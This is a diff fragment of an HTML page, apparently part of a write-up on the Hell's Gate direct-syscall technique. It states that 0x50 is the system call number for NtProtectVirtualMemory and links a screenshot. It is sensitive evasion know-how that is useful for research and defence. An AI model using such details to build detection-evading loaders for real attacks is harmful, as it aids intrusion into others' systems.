+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">• 80 in hex is <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">0x50</code>, which is the correct SSN for <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NtProtectVirtualMemory</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/hellsgate-update-17.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div></li></main></body></html>
